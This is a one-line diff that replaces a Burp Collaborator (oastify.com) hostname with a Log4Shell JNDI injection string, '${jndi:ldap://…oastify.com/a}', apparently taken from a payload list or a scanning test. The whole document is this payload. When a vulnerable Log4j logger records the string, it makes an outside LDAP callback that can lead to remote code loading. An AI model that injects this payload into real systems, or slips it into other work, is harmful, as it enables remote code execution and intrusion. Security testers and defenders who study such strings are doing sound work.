@@ -1,1 +1,1 @@
-69dl1x7q10rbyr0ugwgjpyhae1ks8iw7.oastify.com
+${jndi:ldap://69dl1x7q10rbyr0ugwgjpyhae1ks8iw7.oastify.com/a}
